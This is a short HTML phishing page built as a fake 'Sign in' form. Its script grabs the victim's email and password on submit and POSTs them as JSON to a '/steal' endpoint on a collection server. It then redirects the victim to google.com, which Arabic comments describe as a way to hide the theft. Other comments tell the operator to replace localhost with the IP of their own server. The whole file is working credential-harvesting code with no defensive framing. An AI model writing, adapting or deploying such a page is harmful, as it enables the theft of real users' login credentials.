<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Login</title>
</head>
<body>
  <h2>Sign in</h2>
  <form id="loginForm">
    <input type="email" id="email" placeholder="Email" required /><br><br>
    <input type="password" id="password" placeholder="Password" required /><br><br>
    <button type="submit">Log In</button>
  </form>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      console.log("Sending data:", { email, password });

      fetch('http://localhost:3000/steal', {  // غير الـ IP لـ IP جهازك اللي شغال عليه السيرفر
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
      }).catch(err => console.error('Fetch error:', err));

      // توجيه المستخدم لصفحة وهمية أو حقيقية لتغطية عملية الاختراق
      window.location.href = "https://www.google.com"; // استبدلها بأي رابط تاني لو حابب
    });
  </script>
</body>
</html>
